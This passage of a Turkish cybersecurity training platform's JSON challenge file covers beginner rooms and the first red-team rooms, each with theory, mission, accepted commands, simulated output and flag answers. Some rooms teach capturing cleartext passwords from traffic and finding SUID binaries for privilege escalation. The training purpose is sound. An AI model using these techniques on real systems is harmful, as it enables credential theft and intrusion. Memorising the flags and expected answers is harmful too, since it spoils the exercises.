        "theory": "### En Çok Karıştırılan 3 Kavramın Anatomisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\n* **1. Encoding (Mors Alfabesi):** Şifreleme DEĞİLDİR! Türkçe bir kelimeyi Mors alfabesine çevirirseniz Mors bilen herkes anında okur. Gizlilik sağlamaz, makinelerin veriyi rahat taşıması içindir (Örn: Base64).\n* **2. Hashing (Kıyma Makinesi):** Tek yönlü matematiksel özettir. Eti kıyma makinesine atıp köfte yaparsınız ama köfteyi tekrar eski canlı ete dönüştüremezsiniz. Kullanıcı şifreleri veritabanına asla açık metin yazılmaz, hash olarak saklanır (Örn: SHA-256, BCrypt).\n* **3. Encryption (Çelik Kasa):** Gizli anahtarla kilitlenen şifrelemedir. Yalnızca elinde doğru şifre çözme anahtarı (Private Key) olan kişi kasayı açıp içindeki gerçek veriyi okuyabilir (Örn: AES-256, RSA).\n\n#### Hashing Neden Asla Geri Dönmez?\nHash algoritmaları tek yönlü matematiksel fonksiyondur. 1 kelimelik metin de verseniz, 1000 sayfalık kitap da verseniz tam 64 karakterlik sabit bir özet üretir.",
        "mission": "echo 'LFL_SECRET' | sha256sum komutunu kullanarak gizli metnin tek yönlü SHA-256 kriptografik özetini üretin.",
        "expectedCommand": "echo 'LFL_SECRET' | sha256sum",
        "acceptedCommands": [
            "echo 'LFL_SECRET' | sha256sum",
            "echo \"LFL_SECRET\" | sha256sum",
            "echo LFL_SECRET | sha256sum"
        ],
        "hintExplanation": "<p><strong>echo:</strong> Ekrana metin basar.</p><p><strong>| (Boru Hattı):</strong> Bu metni hash hesaplayıcıya aktarır.</p><p><strong>sha256sum:</strong> Metnin 256-bit (64 haneli onaltılık) geri dönüştürülemez güvenli matematiksel özetini hesaplar.</p>",
        "terminalSuccessOutput": "b5bb9d8014a0f9b1d61e21e796d78dccdf1352f23cd32812f4850b878ae4944c  -\n[TEBRİKLER!] SHA-256 Kriptografik Özeti başarıyla üretildi!\n[MÜFREDAT TAMAMLANDI] 10 Temel Starter Odasını başarıyla bitirdiniz!\n[FLAG] LFL{starter_crypto_hash_vs_encoding_mastered}",
        "flag": "LFL{starter_crypto_hash_vs_encoding_mastered}",
        "nextId": "starter-11"
    },
    {
        "id": "starter-11",
        "track": "starter",
        "title": "Linux Süreçleri (Processes): ps, top, kill ve PID Anatomisi",
        "level": "0. Temel Altyapı",
        "badge": "PROCESS ARCHITECTURE & PID",
        "theory": "### Bilgisayarın İçindeki Canlılar: Prosesler (Processes)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir restorandaki her çalışanın yakasında benzersiz bir numara (PID - Process ID) vardır. Aşçı, garson, kasiyer... Kimin ne kadar yorulduğunu (CPU), tezgahta ne kadar yer kapladığını (Bellek) restoran müdürü (Kernel) bu yaka kartlarına bakarak denetler. Kontrolden çıkan veya müşterilere zarar veren bir garson olursa müdür anında kovma talimatı verir (`kill`).\n\n#### Temel Kavramlar:\n* **PID (Process ID):** Her çalışan programa işletim sistemi tarafından verilen benzersiz kimlik numarasıdır.\n* **ps aux:** Sistemde o an çalışan TÜM prosesleri (kullanıcı, PID, CPU%, Bellek%, çalışan komut) listeler.\n* **kill -9 [PID]:** Donmuş, kontrolden çıkmış veya zararlı bir prosesi işletim sistemi çekirdeğine sinyal göndererek anında sonlandırır.",
        "mission": "Sistemde çalışan tüm süreçleri kullanıcı adları ve PID numaralarıyla birlikte listelemek için ps aux komutunu çalıştırın.",
        "expectedCommand": "ps aux",
        "acceptedCommands": [
                "ps aux",
                "ps -ef",
                "ps -aux"
        ],
        "hintExplanation": "<p><strong>ps:</strong> Process Status (Süreç Durumu) kelimelerinin kısaltmasıdır.</p><p><strong>aux parametreleri:</strong> a: tüm kullanıcıların süreçleri, u: kullanıcı adlarıyla detaylı gösterim, x: terminale bağlı olmayan arka plan servislerini listeler.</p>",
        "terminalSuccessOutput": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 168432 11244 ?        Ss   08:00   0:01 /sbin/init splash\nroot         482  0.0  0.2  72304 18210 ?        S    08:01   0:00 /usr/sbin/sshd -D\nanalyst     1337  4.2  1.8 340212 94210 pts/0    S+   09:12   0:03 python3 /opt/monitor.py\n[TEBRİKLER!] Sistemdeki aktif süreç tablosu başarıyla döküldü!\n[BİLGİ] PID 1337 numaralı Python izleme sürecinin çalıştığını tespit ettiniz.\n[FLAG] LFL{starter_ps_aux_pid_process_mastery}",
        "flag": "LFL{starter_ps_aux_pid_process_mastery}",
        "nextId": "starter-12"
},
    {
        "id": "starter-12",
        "track": "starter",
        "title": "Metin Arama & Log Analizi: grep, Pipe (|) ve Çıktı Yönlendirme",
        "level": "0. Temel Altyapı",
        "badge": "LOG FILTERING & GREP PIPELINE",
        "theory": "### Siber Güvenlikçinin En Büyük Silahı: Log Filtreleme\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nÖnünüze 500 sayfalık kalın bir telefon rehberi konduğunu hayal edin. 'Mehmet' ismini aramak için sayfaları tek tek çevirmek yerine, elinizdeki sihirli bir büyüteci rehberin üzerine tuttuğunuzda yalnızca içinde 'Mehmet' geçen satırların parlaması gibidir. `grep` tam olarak bu sarı fosforlu büyüteçtir.\n\n#### Boru Hattı (| Pipe) Mantığı:\nLinux'ta bir komutun çıktısını diğer komuta girdi olarak vermek için `|` (pipe) karakteri kullanılır:\n* `cat access.log | grep \"404\"` ➔ Log dosyasını oku, içinden sadece 404 içeren satırları süz.\n* `grep -i \"admin\" /etc/passwd` ➔ Büyük/küçük harf duyarsız arama yapar.",
        "mission": "/var/log/auth.log dosyasında başarısız oturum açma denemelerini bulmak için grep 'Failed' /var/log/auth.log komutunu çalıştırın.",
        "expectedCommand": "grep 'Failed' /var/log/auth.log",
        "acceptedCommands": [
                "grep 'Failed' /var/log/auth.log",
                "grep \"Failed\" /var/log/auth.log",
                "grep Failed /var/log/auth.log",
                "cat /var/log/auth.log | grep Failed",
                "cat /var/log/auth.log | grep 'Failed'"
        ],
        "hintExplanation": "<p><strong>grep:</strong> Metin dosyaları veya komut çıktıları içinde regex ve anahtar kelime araması yapar.</p><p><strong>'Failed':</strong> Aranan kelime filtresidir.</p><p><strong>/var/log/auth.log:</strong> Linux sistemlerde kimlik doğrulama ve giriş loglarının tutulduğu standart dosyadır.</p>",
        "terminalSuccessOutput": "May 20 04:12:01 server sshd[8492]: Failed password for invalid user admin from 192.168.1.105 port 44322 ssh2\nMay 20 04:12:04 server sshd[8495]: Failed password for invalid user root from 192.168.1.105 port 44324 ssh2\nMay 20 04:12:08 server sshd[8498]: Failed password for invalid user test from 192.168.1.105 port 44326 ssh2\n[ALARM!] 192.168.1.105 IP adresinden kaba kuvvet (Brute-Force) saldırı izi filtrelendi!\n[TEBRİKLER!] Log analizi ve grep ile ilk siber tehdit kanıtını buldunuz!\n[FLAG] LFL{starter_grep_log_analysis_detective}",
        "flag": "LFL{starter_grep_log_analysis_detective}",
        "nextId": "starter-13"
},
    {
        "id": "starter-13",
        "track": "starter",
        "title": "Ağ Bağlantıları ve Dinleyen Portlar: netstat ve ss Komutları",
        "level": "0. Temel Altyapı",
        "badge": "SOCKETS & LISTENING PORTS",
        "theory": "### Makinede Hangi Gizli Kapılar Açık? Socket Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir otelin resepsiyonuna geçip hangi odaların dolu olduğunu, hangi kapılardan ses geldiğini ve hangi misafirlerin dışarıyla telefon görüşmesi yaptığını gösteren santral panosuna bakmak gibidir. Bilgisayarınızın dış dünyayla kurduğu her bağlantı bir 'Socket' oluşturur.\n\n#### ss (Socket Statistics) Komutu:\nEski `netstat` aracının modern ve ultra hızlı halidir:\n* `-t`: TCP soketlerini göster.\n* `-u`: UDP soketlerini göster.\n* `-l`: Sadece dinleyen (LISTEN durumundaki) açık servis kapılarını listele.\n* `-p`: Hangi programın/prosesin bu portu dinlediğini göster.\n* `-n`: DNS çözmeden sayısal IP ve port olarak listele.",
        "mission": "Sistemde dinleme durumunda olan tüm TCP soketlerini ve port numaralarını listelemek için ss -tln komutunu çalıştırın.",
        "expectedCommand": "ss -tln",
        "acceptedCommands": [
                "ss -tln",
                "ss -tuln",
                "ss -tlpn",
                "netstat -tln",
                "netstat -tuln",
                "ss -lnt"
        ],
        "hintExplanation": "<p><strong>ss:</strong> Socket Statistics komutudur.</p><p><strong>-t:</strong> Sadece TCP trafiğine odaklanır.</p><p><strong>-l:</strong> Sadece LISTEN (gelen bağlantıları bekleyen) portları filtreler.</p><p><strong>-n:</strong> Servis isimleri yerine sayısal portları (Örn: http yerine 80) gösterir.</p>",
        "terminalSuccessOutput": "State      Recv-Q Send-Q   Local Address:Port    Peer Address:Port\nLISTEN     0      128            0.0.0.0:22           0.0.0.0:*\nLISTEN     0      511          127.0.0.1:3306         0.0.0.0:*\nLISTEN     0      512            0.0.0.0:80           0.0.0.0:*\nLISTEN     0      128            0.0.0.0:443          0.0.0.0:*\n[ANALİZ RAPORU]\n* Port 22 (SSH) dış dünyaya açık.\n* Port 80 (HTTP) ve Port 443 (HTTPS) web isteklerini kabul ediyor.\n* Port 3306 (MySQL) güvenli şekilde yalnızca 127.0.0.1 (Localhost) üzerinde dinliyor.\n[FLAG] LFL{starter_ss_sockets_listening_ports_exposed}",
        "flag": "LFL{starter_ss_sockets_listening_ports_exposed}",
        "nextId": "starter-14"
},
    {
        "id": "starter-14",
        "track": "starter",
        "title": "Paketlerin Röntgeni: Ağ Trafiği Yakalama (tcpdump & Wireshark)",
        "level": "0. Temel Altyapı",
        "badge": "PACKET SNIFFING & TCPDUMP",
        "theory": "### Kablodan Akan Her Baytı Dinlemek: Paket Yakalama (Sniffing)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nPostanede çalışan bir görevlinin, masasının üzerinden geçen mektupları teker teker açıp içindeki yazıları gizlice okuması gibidir. Eğer mektup şifreli (HTTPS / TLS) yazılmamışsa, içindeki kullanıcı adı, parola ve mesajlar apaçık okunur.\n\n#### tcpdump Nedir?\nKomut satırından ağ kartından geçen ham paketleri canlı olarak yakalayan efsanevi araçtır:\n* `-i eth0`: eth0 ağ kartını dinle.\n* `-c 3`: Sadece 3 adet paket yakala ve dur.\n* `-A`: Paket yükünü (Payload) ASCII metin olarak ekrana dök.\n* `port 80`: Yalnızca HTTP trafiğini filtrele.",
        "mission": "eth0 ağ arayüzünden 3 adet HTTP paketini ASCII metin olarak yakalamak için tcpdump -i eth0 -c 3 -A 'port 80' komutunu çalıştırın.",
        "expectedCommand": "tcpdump -i eth0 -c 3 -A 'port 80'",
        "acceptedCommands": [
                "tcpdump -i eth0 -c 3 -A 'port 80'",
                "tcpdump -i eth0 -c 3 -A port 80",
                "tcpdump -i eth0 -c 3",
                "tcpdump -c 3 -i eth0 -A 'port 80'"
        ],
        "hintExplanation": "<p><strong>tcpdump:</strong> Canlı ağ dinleme aracıdır.</p><p><strong>-i eth0:</strong> Dinlenecek ethernet kartını seçer.</p><p><strong>-c 3:</strong> 3 paket yakalayınca komutu sonlandırır.</p><p><strong>-A:</strong> Paket içeriğindeki metinleri (ASCII) gösterir.</p>",
        "terminalSuccessOutput": "listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n09:42:15.102381 IP 10.0.2.15.54122 > 192.168.1.1.80: Flags [P.], seq 1:180, ack 1\nPOST /login.php HTTP/1.1\nHost: secure-portal.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nusername=admin&password=SuperSecretPassword2026!\n\n3 packets captured, 3 packets received by filter, 0 packets dropped by kernel\n[İSTİHBARAT] HTTP şifresiz olduğu için açık metin parola (SuperSecretPassword2026!) havada yakalandı!\n[GÜVENLİK KURALI] Bu yüzden modern internette daima HTTPS (TLS 1.3) kullanılmalıdır.\n[FLAG] LFL{starter_tcpdump_cleartext_traffic_intercepted}",
        "flag": "LFL{starter_tcpdump_cleartext_traffic_intercepted}",
        "nextId": "starter-15"
},
    {
        "id": "starter-15",
        "track": "starter",
        "title": "Web Uygulama Anatomisi: Cookie, Session & curl ile Başlık Analizi",
        "level": "0. Temel Altyapı",
        "badge": "WEB SESSIONS & HTTP HEADERS",
        "theory": "### Web Siteleri Sizi Nasıl Tanır? Durumsuz (Stateless) HTTP Çözümü\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir sinema gişesinden bilet aldığınızda gişe memuru yüzünüzü 5 dakika sonra unutur. Ancak kapıdaki görevliye biletinizi (Session Cookie) gösterirseniz salona girmenize izin verir. Web sunucuları da böyledir; her yeni istekte sizi unutur, ta ki tarayıcınız sunucuya 'Bak bu benim oturum çerezim' diyene kadar.\n\n#### Kritik Çerez Güvenlik Bayrakları:\n* **HttpOnly:** JavaScript'in (XSS saldırılarının) çerezi okumasını engeller.\n* **Secure:** Çerezin yalnızca HTTPS şifreli tünelden gönderilmesini şart koşar.\n* **SameSite=Strict:** Başka sitelerin kullanıcının adına istek atmasını (CSRF) engeller.",
        "mission": "curl -I https://bank.lfl.local komutunu kullanarak sunucunun gönderdiği HTTP başlıklarını ve çerez yapılandırmasını inceleyin.",
        "expectedCommand": "curl -I https://bank.lfl.local",
        "acceptedCommands": [
                "curl -I https://bank.lfl.local",
                "curl -i https://bank.lfl.local",
                "curl -I http://bank.lfl.local",
                "curl -I --head https://bank.lfl.local"
        ],
        "hintExplanation": "<p><strong>curl:</strong> Komut satırından URL'lere istek atan güçlü web istemcisidir.</p><p><strong>-I (Head):</strong> Sayfa içeriğini (HTML) değil, yalnızca HTTP sunucu yanıt başlıklarını (Headers) çeker.</p>",
        "terminalSuccessOutput": "HTTP/2 200 OK\ndate: Thu, 08 Nov 2026 18:14:22 GMT\nserver: Kestrel\ncontent-type: text/html; charset=utf-8\nset-cookie: session_token=abc98124fa10e; Path=/; Secure; HttpOnly; SameSite=Strict\nstrict-transport-security: max-age=31536000; includeSubDomains; preload\nx-frame-options: DENY\nx-content-type-options: nosniff\n\n[ANALİZ] Sunucu HttpOnly, Secure ve SameSite bayraklarını kusursuz uygulamış!\n[ÖĞRENİLEN DERS] Oturum çerezleri güvende olduğunda XSS saldırganları token'ı çalamaz.\n[FLAG] LFL{starter_curl_session_cookie_security_master}",
        "flag": "LFL{starter_curl_session_cookie_security_master}",
        "nextId": "starter-16"
},
    {
        "id": "starter-16",
        "track": "starter",
        "title": "Güvenli Uzak Bağlantı: SSH (Secure Shell) ve Anahtar Çiftleri",
        "level": "0. Temel Altyapı",
        "badge": "SSH KEYS & SECURE REMOTE ACCESS",
        "theory": "### Parolalara Veda: Asimetrik Kriptografi ile SSH\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKlasik parola kullanmak kapıya 4 haneli şifreli kilit takmak gibidir; biri omzunuzun üzerinden bakarsa şifreyi öğrenir. SSH Anahtar Çifti (Public/Private Key) ise şöyledir: Kapıya akıllı bir asma kilit (Public Key) takarsınız. O kilidi yalnızca sizin cebinizdeki benzersiz parmak izli elektronik anahtarınız (Private Key) açabilir.\n\n#### SSH Anahtar Mimarisi:\n* **id_rsa (Private Key):** SADECE sizde kalır. Asla kimseye verilmez, chmod 600 ile korunmalıdır.\n* **id_rsa.pub (Public Key):** Dünyadaki tüm sunucuların `~/.ssh/authorized_keys` dosyasına eklenebilir.\n* **Port 22:** Standart SSH iletişim portudur; trafiğin tamamı uçtan uca AES ile şifrelenir.",
        "mission": "Özel kimlik anahtarını kullanarak güvenli analist sunucusuna bağlanmak için ssh -i ~/.ssh/id_rsa analyst@10.10.10.20 komutunu çalıştırın.",
        "expectedCommand": "ssh -i ~/.ssh/id_rsa analyst@10.10.10.20",
        "acceptedCommands": [
                "ssh -i ~/.ssh/id_rsa analyst@10.10.10.20",
                "ssh analyst@10.10.10.20 -i ~/.ssh/id_rsa",
                "ssh analyst@10.10.10.20"
        ],
        "hintExplanation": "<p><strong>ssh:</strong> Secure Shell uzak bağlantı komutudur.</p><p><strong>-i:</strong> Bağlantıda kullanılacak özel anahtar dosyasını (Identity File) belirtir.</p><p><strong>analyst@10.10.10.20:</strong> Bağlanılacak hedef kullanıcı ve IP adresidir.</p>",
        "terminalSuccessOutput": "The authenticity of host '10.10.10.20 (10.10.10.20)' can't be established.\nED25519 key fingerprint is SHA256:d8Q+9k23JLx7bE0v2A+mBq5...\nAuthenticating with public key \"analyst@lfl-workstation\"\nWelcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-31-generic x86_64)\nanalyst@lfl-bastion:~$ whoami\nanalyst\n[BAĞLANTI BAŞARILI] Parolasız, kırılması imkansız 4096-bit RSA anahtarıyla güvenli oturum açıldı!\n[FLAG] LFL{starter_ssh_asymmetric_keypair_authentication}",
        "flag": "LFL{starter_ssh_asymmetric_keypair_authentication}",
        "nextId": "starter-17"
},
    {
        "id": "starter-17",
        "track": "starter",
        "title": "Güvenlik Duvarı (Firewall) Temelleri: ufw ve iptables ile Savunma",
        "level": "0. Temel Altyapı",
        "badge": "FIREWALL RULES & PACKET FILTERING",
        "theory": "### Kalenin Kapısını Koruyan Nöbetçi: Güvenlik Duvarı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir rezidansın nizamiyesindeki güvenlik görevlisidir. Gelen her araca 'Kimi ziyarete geldin? Plakan ne?' diye sorar. Listedeki daire numarasına (Port 80/443) gidiyorsa bariyeri kaldırır (ALLOW). Kara listedeki bir araçsa (Saldırgan IP) içeri sokmaz ve kapıdan kovar (DROP/DENY).\n\n#### Linux Güvenlik Duvarı (UFW - Uncomplicated Firewall):\n* **ufw status:** Mevcut güvenlik kurallarını ve durumunu listeler.\n* **ufw allow 22/tcp:** 22 numaralı SSH portunu tüm dünyaya açar.\n* **ufw deny from [IP]:** Belirtilen saldırgan IP'sinden gelen tüm istekleri sessizce çöpe atar.",
        "mission": "198.51.100.55 adresinden gelen saldırgan trafiğini engellemek için ufw deny from 198.51.100.55 komutunu çalıştırın.",
        "expectedCommand": "ufw deny from 198.51.100.55",
        "acceptedCommands": [
                "ufw deny from 198.51.100.55",
                "sudo ufw deny from 198.51.100.55",
                "iptables -A INPUT -s 198.51.100.55 -j DROP"
        ],
        "hintExplanation": "<p><strong>ufw:</strong> Linux'un kolay yönetilebilir güvenlik duvarı aracıdır.</p><p><strong>deny from:</strong> Belirtilen kaynaktan gelen tüm bağlantı isteklerini reddeder.</p><p><strong>198.51.100.55:</strong> Saldırganın kaynak IP adresidir.</p>",
        "terminalSuccessOutput": "Rule added\nRule added (v6)\n[GÜVENLİK DUVARI GÜNCELLENDİ]\nStatus: active\nTo                         Action      From\n--                         ------      ----\nAnywhere                   DENY        198.51.100.55\n22/tcp                     ALLOW       Anywhere\n80/tcp                     ALLOW       Anywhere\n443/tcp                    ALLOW       Anywhere\n\n[KALKAN AKTİF] 198.51.100.55 IP adresinden gelen tüm paketler kapıda imha edildi!\n[FLAG] LFL{starter_ufw_firewall_rule_defensive_shield}",
        "flag": "LFL{starter_ufw_firewall_rule_defensive_shield}",
        "nextId": "starter-18"
},
    {
        "id": "starter-18",
        "track": "starter",
        "title": "Starter Mezuniyeti: Etik Hackleme, Sorumlu İfşa & CTF Ruhu",
        "level": "0. Temel Altyapı",
        "badge": "ACADEMY GRADUATION & ETHICAL HACKING",
        "theory": "### Büyük Güç Büyük Sorumluluk Getirir: Etik Siber Güvenlik\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir çilingirin elinde istediği her kapıyı açabilecek maymuncuk seti vardır. Ancak çilingir bu aletleri hırsızlık yapmak için değil; kapıda kalan insanlara yardım etmek ve kilitlerin sağlamlığını denetlemek için kullanır. Etik hacker (Beyaz Şapka) tam olarak bu saygın çilingirdir.\n\n#### Altın Kurallar:\n* **İzin Olmadan Test Yapılmaz:** İzniniz olmayan bir sisteme `nmap` atmak bile kanunen suç teşkil edebilir. Daima kendi laboratuvarınızda veya yazılı izinli hedeflerde çalışın.\n* **Sorumlu İfşa (Responsible Disclosure):** Bulduğunuz bir açığı internete sızdırmak yerine doğrudan sistem sahibine raporlayıp düzeltmesi için süre tanıyın.\n* **18 Starter Odasını Tamamladınız!** Artık ağları, portları, DNS'i, Linux çekirdeğini, süreçleri, logları, trafiği ve şifrelemeyi anlayan sağlam bir temele sahipsiniz!",
        "mission": "Starter eğitim patikasını başarıyla tamamladığınızı belgeleyen mezuniyet sertifika bayrağını okumak için cat /home/student/starter_graduation.txt komutunu çalıştırın.",
        "expectedCommand": "cat /home/student/starter_graduation.txt",
        "acceptedCommands": [
                "cat /home/student/starter_graduation.txt",
                "cat starter_graduation.txt",
                "more /home/student/starter_graduation.txt"
        ],
        "hintExplanation": "<p><strong>cat:</strong> Dosya içeriğini ekrana yazdırır.</p><p><strong>starter_graduation.txt:</strong> 18 odalık temel eğitimi bitirdiğinizde size tahsis edilen nihai mezuniyet sertifikasıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🎓 TEBRİKLER! LFL SİBER AKADEMİ STARTER PATİKASINI TAMAMLADINIZ! 🎓\n========================================================================\n[TEMEL YETKİNLİKLER KAZANILDI]:\n✔ Ağ Mimarisi: IP, MAC, Portlar, DNS ve TCP El Sıkışması\n✔ Linux Sistem Yönetimi: Dosya Hiyerarşisi, CLI, İzinler (chmod) & Süreçler (ps)\n✔ Ağ & Trafik Analizi: ss, netstat, Wireshark, tcpdump & HTTP Headers\n✔ Kriptografi & Savunma: Hashleme, SSH Anahtarları ve UFW Güvenlik Duvarı\n\nŞimdi önünüzde 3 büyük uzmanlık yolu açıldı:\n🔴 RED TEAM (12 Görev Odası - Ofansif Saldırı & Pentest)\n🔵 BLUE TEAM (9 Görev Odası - SOC & Tehdit Avcılığı)\n🟣 PURPLE TEAM (6 Görev Odası - Hibrit Tatbikat & Güvenlik Doğrulama)\n\n[MEZUNİYET BAYRAĞI]: LFL{starter_18_rooms_fully_completed_ready_for_specialization}\n========================================================================",
        "flag": "LFL{starter_18_rooms_fully_completed_ready_for_specialization}",
        "nextId": "red-101"
},
    {
        "id": "red-101",
        "track": "red",
        "title": "Ağ Temelleri: TCP/IP & Paket Analizi",
        "level": "1. Temel Altyapı",
        "badge": "NETWORKING & RFC PROTOCOLS",
        "theory": "### Ağ Temelleri: Sistemlerin Çalışma Mantığı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kişinin telefonla konuşmadan önce birbirine \"Alo!\", \"Sesim geliyor mu?\", \"Evet, seni duyuyorum\" demesidir (TCP 3 Yollu El Sıkışma). Karşı taraf duymadan veri aktarımı başlamaz!\n\nSistemlerin çalışma mantığını anlamadan onları manipüle edemezsiniz. İlk adım bu temelleri atmaktır.\n\n#### 1. OSI ve TCP/IP Modelleri:\nAğ trafiği 7 katmanlı OSI (veya 4 katmanlı TCP/IP) mimarisinde paketlenir. Bir saldırgan olarak bilmeniz gereken en kritik nokta **TCP 3-Way Handshake** sürecidir:\n* **SYN:** İstemci, sunucuya rastgele bir sıra numarasıyla (ISN) bağlantı talebi gönderir.\n* **SYN-ACK:** Sunucu portu dinliyorsa talebi kabul eder ve kendi sıra numarasıyla yanıt verir.\n* **ACK:** İstemci onay paketi gönderir; oturum kurulur (ESTABLISHED).\n\n#### 2. Kritik Protokoller ve Varsayılan Portlar:\n* **DNS (Port 53 UDP/TCP):** İsim çözümleme. Zone Transfer (`axfr`) açıkları ve DNS Tünelleme alanı.\n* **HTTP/HTTPS (Port 80/443 TCP):** Web haberleşmesi. İstismar zincirlerinin çoğunun başladığı yüzey.\n* **SSH (Port 22 TCP):** Şifreli uzak yönetim. Brute-force ve anahtar sızıntısı hedefleri.\n* **SMB (Port 445 TCP):** Windows dosya paylaşımı. EternalBlue (MS17-010), NTLM Relay saldırılarının merkezi.\n* **DHCP (Port 67/68 UDP):** Dinamik IP yapılandırması. Rogue DHCP sunucusu ve MitM saldırı alanı.\n\n#### 3. Wireshark ile Trafik Analizi:\nAğ kartının 'promiscuous mode' moduna alınarak kablodan geçen her baytın incelenmesi. Şifrelenmemiş protokollerde (HTTP, FTP, Telnet) şifreler açık metin (cleartext) olarak yakalanır.",
        "mission": "Wireshark/tshark simülasyonunda yakalanan 'traffic.pcap' paket dökümünden HTTP isteklerini filtreleyerek web formundan gönderilen yönetici şifresini ortaya çıkarın.",
        "expectedCommand": "tshark -r traffic.pcap -Y \"http.request\"",
        "acceptedCommands": [
            "tshark -r traffic.pcap -Y http.request",
            "tshark -r traffic.pcap -Y http",
            "tshark -r traffic.pcap -Y \"http.request.method == POST\"",
            "tshark -r traffic.pcap -Y 'http.request.method == \"POST\"'",
            "tcpdump -r traffic.pcap -A",
            "strings traffic.pcap | grep -i password"
        ],
        "hintExplanation": "<p><strong>tshark:</strong> Wireshark programının komut satırı halidir, ağ paketlerini incelememizi sağlar.</p>\n<p><strong>-r traffic.pcap:</strong> \"Read\" parametresidir. Daha önce kaydedilmiş <code>traffic.pcap</code> paket dosyasını okur.</p>\n<p><strong>-Y \"http.request\":</strong> Ekrana binlerce ilgisiz paket yerine yalnızca web tarayıcısının form doldurup sunucuya gönderdiği HTTP isteklerini filtreler. Böylece şifrelenmemiş oturum açma isteğindeki parola açık metin (cleartext) olarak okunur.</p>",
        "terminalSuccessOutput": "[+] TSHARK PAKET AYRIŞTIRICI DEVREDE...\nPaket No: 142 | TCP Kaynak: 192.168.1.45:49152 -> Hedef: 192.168.1.10:80\nPOST /login.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nForm Verisi: username=admin&password=LFL{pcap_cleartext_creds_leaked}\n[FLAG DOĞRULANDI] Açık metin kimlik bilgisi başarıyla ele geçirildi!",
        "flag": "LFL{pcap_cleartext_creds_leaked}",
        "nextId": "red-102"
    },
    {
        "id": "red-102",
        "track": "red",
        "title": "İşletim Sistemleri: Linux Mimarisi & SUID İzinleri",
        "level": "1. Temel Altyapı",
        "badge": "LINUX INTERNALS & BASH",
        "theory": "### Linux Temelleri: Dosya Hiyerarşisi ve İzinler\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSıradan bir memurun, üzerinde \"Genel Müdür Mührü\" olan özel bir evrakı eline aldığında bir dakikalığına genel müdür yetkisiyle emir verebilmesi gibidir (SUID Biti). Eğer bu evrak kötüye kullanılırsa tüm şirket ele geçirilir!\n\nLinux dünyasında her şey bir dosyadır. Cihazlar, prosesler ve soketler dosya sisteminde haritalanır.\n\n#### 1. Linux Dosya İzinleri ve Özel Bayraklar:\nKlasik Linux izinleri Sahip (u), Grup (g) ve Diğerleri (o) için Okuma (r=4), Yazma (w=2) ve Çalıştırma (x=1) şeklindedir.\n* **SUID (Set User ID) Biti:** Bir çalıştırılabilir dosyaya `chmod u+s` verildiğinde, o dosya kimin tarafından çalıştırılırsa çalıştırılsın **dosya sahibinin yetkileriyle** ayağa kalkar.\n* Eğer dosya sahibi `root` ise ve bu program içinde bir komut satırı açabiliyorsanız (Örn: `find`, `vim`, `bash`, `nmap`), anında en yetkili kullanıcı olursunuz.\n\n#### 2. Kritik Dizinler:\n* `/etc/passwd`: Kullanıcı listesi (okunabilir).\n* `/etc/shadow`: Kullanıcı parola hashleri (yalnızca root okuyabilir).\n* `/proc`: Canlı çekirdek ve proses belleği (`/proc/$PID/cmdline`).",
        "mission": "Dosya sistemi kök dizininde (`/`) SUID biti atanmış ikili dosyaları arayın, yetkimiz olmayan dizin hatalarını 2>/dev/null ile gizleyin.",
        "expectedCommand": "find / -perm -u=s -type f 2>/dev/null",
        "acceptedCommands": [
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -u=s 2>/dev/null",
            "find / -perm /4000 -type f 2>/dev/null"
        ],
        "hintExplanation": "<p><strong>find /:</strong> Tüm bilgisayarın ana kök klasöründen (/) aramaya başla demektir.</p>\n<p><strong>-perm -u=s:</strong> \"Permission User SetUID\" iznine sahip programları arar. Bu dosyalar sıradan bir kullanıcı çalıştırsa bile dosyanın asıl sahibi (genellikle root) kimse onun tam yetkisiyle ayağa kalkar!</p>\n<p><strong>-type f:</strong> Klasörleri değil sadece normal dosyaları (file) listeler.</p>\n<p><strong>2>/dev/null:</strong> Okuma yetkimizin olmadığı dizinlerde ekrana dolacak 'Erişim Engellendi' hata yazılarını çöp kutusuna atıp ekranı temiz tutar.</p>",
        "terminalSuccessOutput": "[+] SUID BİTİNE SAHİP DOSYALAR LİSTELENİYOR:\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/local/bin/backup_utility [ZAFİYETLİ SUID: Root izinleriyle çalışıyor!]\n[FLAG] LFL{linux_suid_priv_checker_ok}",
        "flag": "LFL{linux_suid_priv_checker_ok}",
        "nextId": "red-103"
    },
    {
        "id": "red-103",
        "track": "red",
        "title": "İşletim Sistemleri: Windows Registry & Kalıcılık",
        "level": "1. Temel Altyapı",
        "badge": "WINDOWS INTERNALS & REGISTRY",
